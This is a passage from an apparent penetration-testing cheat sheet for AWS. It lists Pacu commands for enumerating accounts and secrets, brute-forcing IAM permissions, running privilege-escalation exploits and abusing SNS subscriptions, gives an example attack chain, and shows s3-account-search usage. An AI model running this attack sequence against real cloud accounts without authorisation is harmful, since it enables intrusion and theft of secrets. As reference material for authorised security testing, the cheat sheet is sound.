 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⣁⣤⣶⡿⣿⣿⠉⠻⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢻⣿⣧⡀
 ⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⣠⣶⣿⡟⠻⣿⠃⠈⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣧
 ⢀⣀⣤⣴⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⢠⣾⣿⠉⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿
 ⠉⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⡟
 ⠀⠀⠀⠀⠉⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡟⠁
 ⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⡀⠀⠀⠀⠀⠀⣴⣆⢀⣴⣆⠀⣼⣆⠀⠀⣶⣶⣶⣶⣶⣶⣶⣶⣾⣿⣿⠿⠋⠀⠀
 ⠀⠀⠀⣼⣿⣿⣿⠿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠓⠒⠒⠚⠛⠛⠛⠛⠛⠛⠛⠛⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀
 ⠀⠀⠀⣿⣿⠟⠁⠀⢸⣿⣿⣿⣿⣿⣿⣿⣶⡀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣷⡄⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷⣆⠀⢰⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠘⠁⠀⠀⠀⢸⣿⣿⡿⠛⠛⢻⣿⣿⡇⠀⢸⣿⣿⡿⠛⠛⢿⣿⣿⡇⠀⢸⣿⣿⡿⠛⠛⢻⣿⣿⣿⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠸⠿⠿⠟⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣧⣤⣤⣼⣿⣿⡇⠀⢸⣿⣿⣧⣤⣤⣼⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⢀⣀⣀⣀⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡏⠉⠉⠉⠉⠀⠀⠀⢸⣿⣿⡏⠉⠉⢹⣿⣿⡇⠀⢸⣿⣿⣇⣀⣀⣸⣿⣿⣿⠀⢸⣿⣿⣿⣀⣀⣀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⡟
 ⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠃⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠃⠀⠀⠘⠛⠛⠃⠀⠀⠉⠛⠛⠛⠛⠛⠛⠋⠀⠀⠀⠀⠙⠛⠛⠛⠛⠛⠉⠀

Version: unknown
What would you like to name this new session? <SESSION>
```

### Common Commands

```console
Pacu (<SESSION>:No Keys Set) > search <MODULE>
Pacu (<SESSION>:No Keys Set) > help <MODULE>
Pacu (<SESSION>:No Keys Set) > sessions
Pacu (<SESSION>:No Keys Set) > swap_session
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > import_keys
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > swap_keys
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > delete_keys
```

### Configuration

```console
Pacu (<SESSION>:No Keys Set) > set_keys
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > regions
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > set_regions <REGION>
```

### Enumeration

```console
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > whoami                                          // get information about current user
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run aws__enum_account                           // enumerate current user account
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run iam__enum_permissions                       // enumerate current users permissions + run whoami again afterwards
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run iam__enum_users_roles_policies_groups       // enumerate users, roles, policies and groups
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > data iam                                        // access enumerated iam data
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run lambda__enum                                // enumerate all lambda functions on the account
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run lambda__enum --region <REGION>              // enumerate lambda functions for a specific reagion
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > data lambda                                     // access enumerated data for lambda
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run ec2__enum                                   // enumerate all ec2 instances
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > data ec2                                        // access enumerate data for all ec2 instances
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run elasticbeanstalk__enum --region <REGION>    // enumerate all elastic beanstalk instances on the account
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run secrets__enum --region <REGION>             // enumerate secrets
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run sns__enum --region <REGION>                 // enumerate all sns configurations on the account
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > data                                            // show the sns data
```

### Brute Forcing

```console
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run iam__bruteforce_permissions --region <REGION>    // brute force iam permissions
```

### Privilege Escalation

```console
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run iam__privesc_scan                                  // run iam privilege escalation scan and perform exploitation
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run iam__privesc_scan --scan-only                      // run iam privilege escalation scan but dont perform exploitation
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run iam__privesc_scan --user-methods <METHOD>          // run iam privilege escalation scan with a specific user-method
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run sns__subscribe --topics <TOPIC> --email <EMAIL>    // run sns subscription exploitation
```

### Example Attack Scenario

```console
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run elasticbeanstalk__enum --region <REGION>         // enumerate elastic beanstalk
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run iam__bruteforce_permissions --region <REGION>    // brute force iam permissions
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run iam__enum_permissions                            // enumeraate iam permissions
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run iam__privesc_scan --scan-only                    // scan for iam privilege escalation vectors
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run iam__privesc_scan --user-methods <METHOD>        // exploit iam user-method
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run secrets__enum --region <REGION>                  // enumerate secrets
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > search sns                                           // search for sns options
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run sns__enum --region <REGION>                      // run sns enumeration
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > data                                                 // get sns data
Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run sns__subscribe --topics <TOPIC> --email <EMAIL>  // exploit sns vulnerable subscription
```

## S3 Account Search

### Installation

```console
$ pipx install s3-account-search
```

### AWS Configuration

```console
$ aws configure
```

### Verify AWS Configuration

```console
$ aws sts get-caller-identity
```

### Get Region

```console
$ curl -I https://<RHOST>.s3.amazonaws.com
```

### Search S3 Account ID

```console
$ s3-account-search arn:aws:iam::422645307575:role/<BUCKET> <RHOST>
```
